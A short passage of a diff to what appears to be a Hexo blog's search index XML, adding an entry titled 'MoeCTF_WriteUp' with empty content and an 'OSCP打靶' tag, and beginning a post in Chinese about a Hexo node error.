+        <category>OSCP打靶</category>
+      </categories>
+      <tags>
+        <tag>OSCP打靶</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MoeCTF_WriteUp</title>
+    <url>/posts/6963a0c7/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>hexo_error_at_node:internal/main/run_main_module</title>
     <url>/posts/d2fe5b0/</url>
     <content><![CDATA[<p>今天本想更新几篇文章到博客上，结果在上传生成后 界面出现问题 </p>
